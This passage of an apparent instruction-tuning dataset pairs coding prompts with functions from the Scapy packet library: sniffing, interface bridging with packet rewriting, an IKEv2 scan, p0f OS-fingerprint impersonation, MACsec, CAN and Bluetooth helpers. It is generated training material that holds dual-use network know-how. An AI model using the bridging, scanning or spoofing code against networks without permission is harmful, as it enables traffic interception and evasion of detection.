except socket.error as ex:\n                    warning(\"Socket %s failed with '%s' and thus\"\n                            \" will be ignored\" % (s, ex))\n                    del sniff_sockets[s]\n                    continue\n                except read_allowed_exceptions:\n                    continue\n                if p is None:\n                    try:\n                        if s.promisc:\n                            continue\n                    except AttributeError:\n                        pass\n                    del sniff_sockets[s]\n                    break\n                if lfilter and not lfilter(p):\n                    continue\n                p.sniffed_on = sniff_sockets[s]\n                c += 1\n                # on_packet_received handles the prn/storage\n                session.on_packet_received(p)\n                if stop_filter and stop_filter(p):\n                    continue_sniff = False\n                    break\n                if 0 < count <= c:\n                    continue_sniff = False\n                    break\n    except KeyboardInterrupt:\n        pass\n    if opened_socket is None:\n        for s in sniff_sockets:\n            s.close()\n    return session.toPacketList()", "response": "Sniff packets and return a list of packets."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbridges and sniff packets between interfaces if1 and if2.", "response": "def bridge_and_sniff(if1, if2, xfrm12=None, xfrm21=None, prn=None, L2socket=None,  # noqa: E501\n                     *args, **kargs):\n    \"\"\"Forward traffic between interfaces if1 and if2, sniff and return\nthe exchanged packets.\n\nArguments:\n\n  if1, if2: the interfaces to use (interface names or opened sockets).\n\n  xfrm12: a function to call when forwarding a packet from if1 to\n      if2. If it returns True, the packet is forwarded as it. If it\n      returns False or None, the packet is discarded. If it returns a\n      packet, this packet is forwarded instead of the original packet\n      one.\n\n  xfrm21: same as xfrm12 for packets forwarded from if2 to if1.\n\n  The other arguments are the same than for the function sniff(),\n      except for offline, opened_socket and iface that are ignored.\n      See help(sniff) for more.\n\n    \"\"\"\n    for arg in ['opened_socket', 'offline', 'iface']:\n        if arg in kargs:\n            log_runtime.warning(\"Argument %s cannot be used in \"\n                                \"bridge_and_sniff() -- ignoring it.\", arg)\n            del kargs[arg]\n\n    def _init_socket(iface, count):\n        if isinstance(iface, SuperSocket):\n            return iface, \"iface%d\" % count\n        else:\n            return (L2socket or conf.L2socket)(iface=iface), iface\n    sckt1, if1 = _init_socket(if1, 1)\n    sckt2, if2 = _init_socket(if2, 2)\n    peers = {if1: sckt2, if2: sckt1}\n    xfrms = {}\n    if xfrm12 is not None:\n        xfrms[if1] = xfrm12\n    if xfrm21 is not None:\n        xfrms[if2] = xfrm21\n\n    def prn_send(pkt):\n        try:\n            sendsock = peers[pkt.sniffed_on]\n        except KeyError:\n            return\n        if pkt.sniffed_on in xfrms:\n            try:\n                newpkt = xfrms[pkt.sniffed_on](pkt)\n            except Exception:\n                log_runtime.warning(\n                    'Exception in transformation function for packet [%s] '\n                    'received on %s -- dropping',\n                    pkt.summary(), pkt.sniffed_on, exc_info=True\n                )\n                return\n            else:\n                if newpkt is True:\n                    newpkt = pkt.original\n                elif not newpkt:\n                    return\n        else:\n            newpkt = pkt.original\n        try:\n            sendsock.send(newpkt)\n        except Exception:\n            log_runtime.warning('Cannot forward packet [%s] received on %s',\n                                pkt.summary(), pkt.sniffed_on, exc_info=True)\n    if prn is None:\n        prn = prn_send\n    else:\n        prn_orig = prn\n\n        def prn(pkt):\n            prn_send(pkt)\n            return prn_orig(pkt)\n\n    return sniff(opened_socket={sckt1: if1, sckt2: if2}, prn=prn,\n                 *args, **kargs)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsniffing packets and print them calling pkt. summary", "response": "def tshark(*args, **kargs):\n    \"\"\"Sniff packets and print them calling pkt.summary(), a bit like text wireshark\"\"\"  # noqa: E501\n    print(\"Capturing on '\" + str(kargs.get('iface') if 'iface' in kargs else conf.iface) + \"'\")  # noqa: E501\n    i = [0]  # This should be a nonlocal variable, using a mutable object for Python 2 compatibility  # noqa: E501\n\n    def _cb(pkt):\n        print(\"%5d\\t%s\" % (i[0], pkt.summary()))\n        i[0] += 1\n    sniff(prn=_cb, store=False, *args, **kargs)\n    print(\"\\n%d packet%s captured\" % (i[0], 's' if i[0] > 1 else ''))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef ikev2scan(ip, **kwargs):\n    return sr(IP(dst=ip) / UDP() / IKEv2(init_SPI=RandString(8),\n                                         exch_type=34) / IKEv2_payload_SA(prop=IKEv2_payload_Proposal()), **kwargs)", "response": "Send a IKEv2 SA to an IP and wait for answers."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _mib_register(ident, value, the_mib, unresolved):\n    if ident in the_mib or ident in unresolved:\n        return ident in the_mib\n    resval = []\n    not_resolved = 0\n    for v in value:\n        if _mib_re_integer.match(v):\n            resval.append(v)\n        else:\n            v = fixname(plain_str(v))\n            if v not in the_mib:\n                not_resolved = 1\n            if v in the_mib:\n                v = the_mib[v]\n            elif v in unresolved:\n                v = unresolved[v]\n            if isinstance(v, list):\n                resval += v\n            else:\n                resval.append(v)\n    if not_resolved:\n        unresolved[ident] = resval\n        return False\n    else:\n        the_mib[ident] = resval\n        keys = list(unresolved)\n        i = 0\n        while i < len(keys):\n            k = keys[i]\n            if _mib_register(k, unresolved[k], the_mib, {}):\n                del(unresolved[k])\n                del(keys[i])\n                i = 0\n            else:\n                i += 1\n\n        return True", "response": "Internal function used to register an OID and its name in a MIBDict"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef load_mib(filenames):\n    the_mib = {'iso': ['1']}\n    unresolved = {}\n    for k in six.iterkeys(conf.mib):\n        _mib_register(conf.mib[k], k.split(\".\"), the_mib, unresolved)\n\n    if isinstance(filenames, (str, bytes)):\n        filenames = [filenames]\n    for fnames in filenames:\n        for fname in glob(fnames):\n            f = open(fname)\n            text = f.read()\n            cleantext = \" \".join(_mib_re_strings.split(\" \".join(_mib_re_comments.split(text))))  # noqa: E501\n            for m in _mib_re_oiddecl.finditer(cleantext):\n                gr = m.groups()\n                ident, oid = gr[0], gr[-1]\n                ident = fixname(ident)\n                oid = oid.split()\n                for i, elt in enumerate(oid):\n                    m = _mib_re_both.match(elt)\n                    if m:\n                        oid[i] = m.groups()[1]\n                _mib_register(ident, oid, the_mib, unresolved)\n\n    newmib = MIBDict(_name=\"MIB\")\n    for oid, key in six.iteritems(the_mib):\n        newmib[\".\".join(key)] = oid\n    for oid, key in six.iteritems(unresolved):\n        newmib[\".\".join(key)] = oid\n\n    conf.mib = newmib", "response": "Load the conf. mib dict from a list of filenames"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nparsing the OID id or OID generator and return real OID", "response": "def _oid(self, x):\n        \"\"\"Parse the OID id/OID generator, and return real OID\"\"\"\n        xl = x.strip(\".\").split(\".\")\n        p = len(xl) - 1\n        while p >= 0 and _mib_re_integer.match(xl[p]):\n            p -= 1\n        if p != 0 or xl[p] not in six.itervalues(self.__dict__):\n            return x\n        xl[p] = next(k for k, v in six.iteritems(self.__dict__) if v == xl[p])\n        return \".\".join(xl[p:])"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting the total size of all under layers", "response": "def _get_underlayers_size(self):\n        \"\"\"\n        get the total size of all under layers\n        :return: number of bytes\n        \"\"\"\n\n        under_layer = self.underlayer\n\n        under_layers_size = 0\n\n        while under_layer and isinstance(under_layer, Dot1Q):\n            under_layers_size += 4\n            under_layer = under_layer.underlayer\n\n        if under_layer and isinstance(under_layer, Ether):\n            # ether header len + FCS len\n            under_layers_size += 14 + 4\n\n        return under_layers_size"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nadd padding to the frame if required.", "response": "def post_build(self, pkt, pay):\n        \"\"\"\n        add padding to the frame if required.\n\n        note that padding is only added if pay is None/empty. this allows us to add  # noqa: E501\n        any payload after the MACControl* PDU if needed (piggybacking).\n        \"\"\"\n\n        if not pay:\n            under_layers_size = self._get_underlayers_size()\n\n            frame_size = (len(pkt) + under_layers_size)\n\n            if frame_size < 64:\n                return pkt + b'\\x00' * (64 - frame_size)\n\n        return pkt + pay"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting pause time for given link speed in seconds", "response": "def get_pause_time(self, speed=ETHER_SPEED_MBIT_1000):\n        \"\"\"\n        get pause time for given link speed in seconds\n\n        :param speed: select link speed to get the pause time for, must be ETHER_SPEED_MBIT_[10,100,1000]  # noqa: E501\n        :return: pause time in seconds\n        :raises MACControlInvalidSpeedException: on invalid speed selector\n        \"\"\"\n\n        try:\n            return self.pause_time * {\n                ETHER_SPEED_MBIT_10: (0.0000001 * 512),\n                ETHER_SPEED_MBIT_100: (0.00000001 * 512),\n                ETHER_SPEED_MBIT_1000: (0.000000001 * 512 * 2)\n            }[speed]\n        except KeyError:\n            raise MACControlInvalidSpeedException('Invalid speed selector given. '  # noqa: E501\n                                                  'Must be one of ETHER_SPEED_MBIT_[10,100,1000]')"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreading a candump log file and return a list of CAN packets.", "response": "def rdcandump(filename, count=None,\n              is_not_log_file_format=False,\n              interface=None):\n    \"\"\"Read a candump log file and return a packet list\n\ncount: read only <count> packets\nis_not_log_file_format: read input with candumps stdout format\ninterfaces: return only packets from a specified interface\n\n    \"\"\"\n    try:\n        if isinstance(filename, six.string_types):\n            file = open(filename, \"rb\")\n        else:\n            file = filename\n\n        pkts = list()\n        ifilter = None\n        if interface is not None:\n            if isinstance(interface, six.string_types):\n                ifilter = [interface]\n            else:\n                ifilter = interface\n\n        for l in file.readlines():\n            if is_not_log_file_format:\n                h, data = l.split(b']')\n                intf, idn, le = h.split()\n                t = None\n            else:\n                t, intf, f = l.split()\n                idn, data = f.split(b'#')\n                le = None\n                t = float(t[1:-1])\n\n            if ifilter is not None and intf.decode('ASCII') not in ifilter:\n                continue\n\n            data = data.replace(b' ', b'')\n            data = data.strip()\n\n            pkt = CAN(identifier=int(idn, 16), data=binascii.unhexlify(data))\n            if le is not None:\n                pkt.length = int(le[1:])\n            else:\n                pkt.length = len(pkt.data)\n\n            if len(idn) > 3:\n                pkt.flags = 0b100\n\n            if t is not None:\n                pkt.time = t\n\n            pkts.append(pkt)\n            if count is not None and len(pkts) >= count:\n                break\n\n    finally:\n        file.close()\n\n    return pkts"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef inv_endianness(pkt):\n        len_partial = len(pkt) - 4  # len of the packet, CAN ID excluded\n        return struct.pack('<I{}s'.format(len_partial),\n                           *struct.unpack('>I{}s'.format(len_partial), pkt))", "response": "Invert the order of the first four bytes of a CAN packet"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nimplements the swap-bytes functionality when building this is based on a copy of the Packet.self_build default method. The goal is to affect only the CAN layer data and keep under layers (e.g LinuxCooked) unchanged", "response": "def post_build(self, pkt, pay):\n        \"\"\" Implements the swap-bytes functionality when building\n\n        this is based on a copy of the Packet.self_build default method.\n        The goal is to affect only the CAN layer data and keep\n        under layers (e.g LinuxCooked) unchanged\n        \"\"\"\n        if conf.contribs['CAN']['swap-bytes']:\n            return CAN.inv_endianness(pkt) + pay\n        return pkt + pay"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef pkt2uptime(pkt, HZ=100):\n    if not isinstance(pkt, Packet):\n        raise TypeError(\"Not a TCP packet\")\n    if isinstance(pkt, NoPayload):\n        raise TypeError(\"Not a TCP packet\")\n    if not isinstance(pkt, TCP):\n        return pkt2uptime(pkt.payload)\n    for opt in pkt.options:\n        if opt[0] == \"Timestamp\":\n            # t = pkt.time - opt[1][0] * 1.0/HZ\n            # return time.ctime(t)\n            t = opt[1][0] / HZ\n            return t\n    raise TypeError(\"No timestamp option\")", "response": "Calculate the date the machine which emitted the packet booted using TCP timestamp"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef p0f_impersonate(pkt, osgenre=None, osdetails=None, signature=None,\n                    extrahops=0, mtu=1500, uptime=None):\n    \"\"\"Modifies pkt so that p0f will think it has been sent by a\nspecific OS.  If osdetails is None, then we randomly pick up a\npersonality matching osgenre. If osgenre and signature are also None,\nwe use a local signature (using p0f_getlocalsigs). If signature is\nspecified (as a tuple), we use the signature.\n\nFor now, only TCP Syn packets are supported.\nSome specifications of the p0f.fp file are not (yet) implemented.\"\"\"\n    pkt = pkt.copy()\n    # pkt = pkt.__class__(raw(pkt))\n    while pkt.haslayer(IP) and pkt.haslayer(TCP):\n        pkt = pkt.getlayer(IP)\n        if isinstance(pkt.payload, TCP):\n            break\n        pkt = pkt.payload\n\n    if not isinstance(pkt, IP) or not isinstance(pkt.payload, TCP):\n        raise TypeError(\"Not a TCP/IP packet\")\n\n    db = p0f_selectdb(pkt.payload.flags)\n    if osgenre:\n        pb = db.get_base()\n        if pb is None:\n            pb = []\n        pb = [x for x in pb if x[6] == osgenre]\n        if osdetails:\n            pb = [x for x in pb if x[7] == osdetails]\n    elif signature:\n        pb = [signature]\n    else:\n        pb = p0f_getlocalsigs()[db]\n    if db == p0fr_kdb:\n        # 'K' quirk <=> RST+ACK\n        if pkt.payload.flags & 0x4 == 0x4:\n            pb = [x for x in pb if 'K' in x[5]]\n        else:\n            pb = [x for x in pb if 'K' not in x[5]]\n    if not pb:\n        raise Scapy_Exception(\"No match in the p0f database\")\n    pers = pb[random.randint(0, len(pb) - 1)]\n\n    # options (we start with options because of MSS)\n    # Take the options already set as \"hints\" to use in the new packet if we\n    # can. MSS, WScale and Timestamp can all be wildcarded in a signature, so\n    # we'll use the already-set values if they're valid integers.\n    orig_opts = dict(pkt.payload.options)\n    int_only = lambda val: val if isinstance(val, six.integer_types) else None\n    mss_hint = int_only(orig_opts.get('MSS'))\n    wscale_hint = int_only(orig_opts.get('WScale'))\n    ts_hint = [int_only(o) for o in orig_opts.get('Timestamp', (None, None))]\n\n    options = []\n    if pers[4] != '.':\n        for opt in pers[4].split(','):\n            if opt[0] == 'M':\n                # MSS might have a maximum size because of window size\n                # specification\n                if pers[0][0] == 'S':\n                    maxmss = (2**16 - 1) // int(pers[0][1:])\n                else:\n                    maxmss = (2**16 - 1)\n                # disregard hint if out of range\n                if mss_hint and not 0 <= mss_hint <= maxmss:\n                    mss_hint = None\n                # If we have to randomly pick up a value, we cannot use\n                # scapy RandXXX() functions, because the value has to be\n                # set in case we need it for the window size value. That's\n                # why we use random.randint()\n                if opt[1:] == '*':\n                    if mss_hint is not None:\n                        options.append(('MSS', mss_hint))\n                    else:\n                        options.append(('MSS', random.randint(1, maxmss)))\n                elif opt[1] == '%':\n                    coef = int(opt[2:])\n                    if mss_hint is not None and mss_hint % coef == 0:\n                        options.append(('MSS', mss_hint))\n                    else:\n                        options.append((\n                            'MSS', coef * random.randint(1, maxmss // coef)))\n                else:\n                    options.append(('MSS', int(opt[1:])))\n            elif opt[0] == 'W':\n                if wscale_hint and not 0 <= wscale_hint < 2**8:\n                    wscale_hint = None\n                if opt[1:] == '*':\n                    if wscale_hint is not None:\n                        options.append(('WScale', wscale_hint))\n                    else:\n                        options.append(('WScale', RandByte()))\n                elif opt[1] == '%':\n                    coef = int(opt[2:])\n                    if wscale_hint is not None and wscale_hint % coef == 0:\n                        options.append(('WScale', wscale_hint))\n                    else:\n                        options.append((\n                            'WScale', coef * RandNum(min=1, max=(2**8 - 1) // coef)))  # noqa: E501\n                else:\n                    options.append(('WScale', int(opt[1:])))\n            elif opt == 'T0':\n                options.append(('Timestamp', (0, 0)))\n            elif opt == 'T':\n                # Determine first timestamp.\n                if uptime is not None:\n                    ts_a = uptime\n                elif ts_hint[0] and 0 < ts_hint[0] < 2**32:\n                    # Note: if first ts is 0, p0f registers it as \"T0\" not \"T\",\n                    # hence we don't want to use the hint if it was 0.\n                    ts_a = ts_hint[0]\n                else:\n                    ts_a = random.randint(120, 100 * 60 * 60 * 24 * 365)\n                # Determine second timestamp.\n                if 'T' not in pers[5]:\n                    ts_b = 0\n                elif ts_hint[1] and 0 < ts_hint[1] < 2**32:\n                    ts_b = ts_hint[1]\n                else:\n                    # FIXME: RandInt() here does not work (bug (?) in\n                    # TCPOptionsField.m2i often raises \"OverflowError:\n                    # long int too large to convert to int\" in:\n                    #    oval = struct.pack(ofmt, *oval)\"\n                    # Actually, this is enough to often raise the error:\n                    #    struct.pack('I', RandInt())\n                    ts_b = random.randint(1, 2**32 - 1)\n                options.append(('Timestamp', (ts_a, ts_b)))\n            elif opt == 'S':\n                options.append(('SAckOK', ''))\n            elif opt == 'N':\n                options.append(('NOP', None))\n            elif opt == 'E':\n                options.append(('EOL', None))\n            elif opt[0] == '?':\n                if int(opt[1:]) in TCPOptions[0]:\n                    optname = TCPOptions[0][int(opt[1:])][0]\n                    optstruct = TCPOptions[0][int(opt[1:])][1]\n                    options.append((optname,\n                                    struct.unpack(optstruct,\n                                                  RandString(struct.calcsize(optstruct))._fix())))  # noqa: E501\n                else:\n                    options.append((int(opt[1:]), ''))\n            # FIXME: qqP not handled\n            else:\n                warning(\"unhandled TCP option \" + opt)\n            pkt.payload.options = options\n\n    # window size\n    if pers[0] == '*':\n        pkt.payload.window = RandShort()\n    elif pers[0].isdigit():\n        pkt.payload.window = int(pers[0])\n    elif pers[0][0] == '%':\n        coef = int(pers[0][1:])\n        pkt.payload.window = coef * RandNum(min=1, max=(2**16 - 1) // coef)\n    elif pers[0][0] == 'T':\n        pkt.payload.window = mtu * int(pers[0][1:])\n    elif pers[0][0] == 'S':\n        # needs MSS set\n        mss = [x for x in options if x[0] == 'MSS']\n        if not mss:\n            raise Scapy_Exception(\"TCP window value requires MSS, and MSS option not set\")  # noqa: E501\n        pkt.payload.window = mss[0][1] * int(pers[0][1:])\n    else:\n        raise Scapy_Exception('Unhandled window size specification')\n\n    # ttl\n    pkt.ttl = pers[1] - extrahops\n    # DF flag\n    pkt.flags |= (2 * pers[2])\n    # FIXME: ss (packet size) not handled (how ? may be with D quirk\n    # if present)\n    # Quirks\n    if pers[5] != '.':\n        for qq in pers[5]:\n            # FIXME: not handled: P, I, X, !\n            # T handled with the Timestamp option\n            if qq == 'Z':\n                pkt.id = 0\n            elif qq == 'U':\n                pkt.payload.urgptr = RandShort()\n            elif qq == 'A':\n                pkt.payload.ack = RandInt()\n            elif qq == 'F':\n                if db == p0fo_kdb:\n                    pkt.payload.flags |= 0x20  # U\n                else:\n                    pkt.payload.flags |= random.choice([8, 32, 40])  # P/U/PU\n            elif qq == 'D' and db != p0fo_kdb:\n                pkt /= conf.raw_layer(load=RandString(random.randint(1, 10)))  # XXX p0fo.fp  # noqa: E501\n            elif qq == 'Q':\n                pkt.payload.seq = pkt.payload.ack\n            # elif qq == '0': pkt.payload.seq = 0\n        # if db == p0fr_kdb:\n        # '0' quirk is actually not only for p0fr.fp (see\n        # packet2p0f())\n    if '0' in pers[5]:\n        pkt.payload.seq = 0\n    elif pkt.payload.seq == 0:\n        pkt.payload.seq = RandInt()\n\n    while pkt.underlayer:\n        pkt = pkt.underlayer\n    return pkt", "response": "Modifies a packet so that it has been sent by a specific OS."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngenerates the response block of this request.", "response": "def get_response(self):\n        \"\"\"Generate the response block of this request.\n        Careful: it only sets the fields which can be set from the request\n        \"\"\"\n        res = IODControlRes()\n        for field in [\"ARUUID\", \"SessionKey\", \"AlarmSequenceNumber\"]:\n            res.setfieldval(field, self.getfieldval(field))\n\n        res.block_type = self.block_type + 0x8000\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_response(self):\n        res = IODWriteRes()\n        for field in [\"seqNum\", \"ARUUID\", \"API\", \"slotNumber\",\n                      \"subslotNumber\", \"index\"]:\n            res.setfieldval(field, self.getfieldval(field))\n        return res", "response": "Generate the response block of this request."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef i2len(self, pkt, val):\n        fld_len = self._fld.i2len(pkt, val)\n        return fld_len + self.padlen(fld_len)", "response": "get the length of the field including the padding length"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ngenerate the response block of this request.", "response": "def get_response(self):\n        \"\"\"Generate the response block of this request.\n        Careful: it only sets the fields which can be set from the request\n        \"\"\"\n        res = IODWriteMultipleRes()\n        for field in [\"seqNum\", \"ARUUID\", \"API\", \"slotNumber\",\n                      \"subslotNumber\", \"index\"]:\n            res.setfieldval(field, self.getfieldval(field))\n\n        # append all block response\n        res_blocks = []\n        for block in self.getfieldval(\"blocks\"):\n            res_blocks.append(block.get_response())\n        res.setfieldval(\"blocks\", res_blocks)\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngenerates the response block of this request.", "response": "def get_response(self):\n        \"\"\"Generate the response block of this request.\n        Careful: it only sets the fields which can be set from the request\n        \"\"\"\n        res = ARBlockRes()\n        for field in [\"ARType\", \"ARUUID\", \"SessionKey\"]:\n            res.setfieldval(field, self.getfieldval(field))\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ngenerate the response block of this request.", "response": "def get_response(self):\n        \"\"\"Generate the response block of this request.\n        Careful: it only sets the fields which can be set from the request\n        \"\"\"\n        res = IOCRBlockRes()\n        for field in [\"IOCRType\", \"IOCRReference\", \"FrameID\"]:\n            res.setfieldval(field, self.getfieldval(field))\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nchecking if the class can handle this item", "response": "def can_handle(cls, pkt, rpc):\n        \"\"\"heuristical guess_payload_class\"\"\"\n        # type = 0 => request\n        if rpc.getfieldval(\"type\") == 0 and \\\n                str(rpc.object_uuid).startswith(\"dea00000-6c97-11d1-8271-\"):\n            return True\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngenerates an IV for the packet", "response": "def make_iv(self, pkt):\n        \"\"\"generate an IV for the packet\"\"\"\n        if self.xpn_en:\n            tmp_pn = (self.pn & 0xFFFFFFFF00000000) | (pkt[MACsec].pn & 0xFFFFFFFF)  # noqa: E501\n            tmp_iv = self.ssci + struct.pack('!Q', tmp_pn)\n            return bytes(bytearray([a ^ b for a, b in zip(bytearray(tmp_iv), bytearray(self.salt))]))  # noqa: E501\n        else:\n            return self.sci + struct.pack('!I', pkt[MACsec].pn)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef split_pkt(pkt, assoclen, icvlen=0):\n        data = raw(pkt)\n        assoc = data[:assoclen]\n        if icvlen:\n            icv = data[-icvlen:]\n            enc = data[assoclen:-icvlen]\n        else:\n            icv = b''\n            enc = data[assoclen:]\n        return assoc, enc, icv", "response": "split the packet into associated data plaintext or ciphertext and ICV"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nencapsulate a frame using this Secure Association", "response": "def encap(self, pkt):\n        \"\"\"encapsulate a frame using this Secure Association\"\"\"\n        if pkt.name != Ether().name:\n            raise TypeError('cannot encapsulate packet in MACsec, must be Ethernet')  # noqa: E501\n        hdr = copy.deepcopy(pkt)\n        payload = hdr.payload\n        del hdr.payload\n        tag = MACsec(sci=self.sci, an=self.an,\n                     SC=self.send_sci,\n                     E=self.e_bit(), C=self.c_bit(),\n                     shortlen=MACsecSA.shortlen(pkt),\n                     pn=(self.pn & 0xFFFFFFFF), type=pkt.type)\n        hdr.type = ETH_P_MACSEC\n        return hdr / tag / payload"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef decap(self, orig_pkt):\n        if orig_pkt.name != Ether().name or orig_pkt.payload.name != MACsec().name:  # noqa: E501\n            raise TypeError('cannot decapsulate MACsec packet, must be Ethernet/MACsec')  # noqa: E501\n        packet = copy.deepcopy(orig_pkt)\n        prev_layer = packet[MACsec].underlayer\n        prev_layer.type = packet[MACsec].type\n        next_layer = packet[MACsec].payload\n        del prev_layer.payload\n        if prev_layer.name == Ether().name:\n            return Ether(raw(prev_layer / next_layer))\n        return prev_layer / next_layer", "response": "decapsulate a MACsec frame"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef encrypt(self, orig_pkt, assoclen=None):\n        hdr = copy.deepcopy(orig_pkt)\n        del hdr[MACsec].payload\n        del hdr[MACsec].type\n        pktlen = len(orig_pkt)\n        if self.send_sci:\n            hdrlen = NOSCI_LEN + SCI_LEN\n        else:\n            hdrlen = NOSCI_LEN\n        if assoclen is None or not self.do_encrypt:\n            if self.do_encrypt:\n                assoclen = hdrlen\n            else:\n                assoclen = pktlen\n        iv = self.make_iv(orig_pkt)\n        assoc, pt, _ = MACsecSA.split_pkt(orig_pkt, assoclen)\n        encryptor = Cipher(\n            algorithms.AES(self.key),\n            modes.GCM(iv),\n            backend=default_backend()\n        ).encryptor()\n        encryptor.authenticate_additional_data(assoc)\n        ct = encryptor.update(pt) + encryptor.finalize()\n        hdr[MACsec].payload = Raw(assoc[hdrlen:assoclen] + ct + encryptor.tag)\n        return hdr", "response": "encrypt a MACsec frame for this Secure Association"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef decrypt(self, orig_pkt, assoclen=None):\n        hdr = copy.deepcopy(orig_pkt)\n        del hdr[MACsec].payload\n        pktlen = len(orig_pkt)\n        if self.send_sci:\n            hdrlen = NOSCI_LEN + SCI_LEN\n        else:\n            hdrlen = NOSCI_LEN\n        if assoclen is None or not self.do_encrypt:\n            if self.do_encrypt:\n                assoclen = hdrlen\n            else:\n                assoclen = pktlen - self.icvlen\n        iv = self.make_iv(hdr)\n        assoc, ct, icv = MACsecSA.split_pkt(orig_pkt, assoclen, self.icvlen)\n        decryptor = Cipher(\n            algorithms.AES(self.key),\n            modes.GCM(iv, icv),\n            backend=default_backend()\n        ).decryptor()\n        decryptor.authenticate_additional_data(assoc)\n        pt = assoc[hdrlen:assoclen]\n        pt += decryptor.update(ct)\n        pt += decryptor.finalize()\n        hdr[MACsec].type = struct.unpack('!H', pt[0:2])[0]\n        hdr[MACsec].payload = Raw(pt[2:])\n        return hdr", "response": "decrypts a MACsec frame for this Secure Association"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef srbt(bt_address, pkts, inter=0.1, *args, **kargs):\n    if \"port\" in kargs:\n        s = conf.BTsocket(bt_address=bt_address, port=kargs.pop(\"port\"))\n    else:\n        s = conf.BTsocket(bt_address=bt_address)\n    a, b = sndrcv(s, pkts, inter=inter, *args, **kargs)\n    s.close()\n    return a, b", "response": "send and receive using a bluetooth socket"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nsend and receive 1 packet using bluetooth socket", "response": "def srbt1(bt_address, pkts, *args, **kargs):\n    \"\"\"send and receive 1 packet using a bluetooth socket\"\"\"\n    a, b = srbt(bt_address, pkts, *args, **kargs)\n    if len(a) > 0:\n        return a[0][1]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef register_magic_payload(cls, payload_cls, magic_check=None):\n        if magic_check is None:\n            if hasattr(payload_cls, \"magic_check\"):\n                magic_check = payload_cls.magic_check\n            else:\n                raise TypeError(\"magic_check not specified, and {} has no \"\n                                \"attribute magic_check\".format(payload_cls))\n\n        cls.registered_magic_payloads[payload_cls] = magic_check", "response": "Registers a payload type that uses magic data."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn true if pkt is using SOMEIP - TP else returns false.", "response": "def _is_tp(pkt):\n        \"\"\"Returns true if pkt is using SOMEIP-TP, else returns false.\"\"\"\n\n        tp = [SOMEIP.TYPE_TP_REQUEST, SOMEIP.TYPE_TP_REQUEST_NO_RET,\n              SOMEIP.TYPE_TP_NOTIFICATION, SOMEIP.TYPE_TP_RESPONSE,\n              SOMEIP.TYPE_TP_ERROR]\n        if isinstance(pkt, Packet):\n            return pkt.msg_type in tp\n        else:\n            return pkt[15] in tp"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef fragment(self, fragsize=1392):\n        fnb = 0\n        fl = self\n        lst = list()\n        while fl.underlayer is not None:\n            fnb += 1\n            fl = fl.underlayer\n\n        for p in fl:\n            s = raw(p[fnb].payload)\n            nb = (len(s) + fragsize) // fragsize\n            for i in range(nb):\n                q = p.copy()\n                del q[fnb].payload\n                q[fnb].len = SOMEIP.LEN_OFFSET_TP + \\\n                    len(s[i * fragsize:(i + 1) * fragsize])\n                q[fnb].more_seg = 1\n                if i == nb - 1:\n                    q[fnb].more_seg = 0\n                q[fnb].offset += i * fragsize // 16\n                r = conf.raw_layer(load=s[i * fragsize:(i + 1) * fragsize])\n                r.overload_fields = p[fnb].payload.overload_fields.copy()\n                q.add_payload(r)\n                lst.append(q)\n\n        return lst", "response": "Fragment SOME IP - TP"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngenerating the next RadioTapExtendedPresenceMask", "response": "def _next_radiotap_extpm(pkt, lst, cur, s):\n    \"\"\"Generates the next RadioTapExtendedPresenceMask\"\"\"\n    if cur is None or (cur.present and cur.present.Ext):\n        st = len(lst) + (cur is not None)\n        return lambda *args: RadioTapExtendedPresenceMask(*args, index=st)\n    return None"}
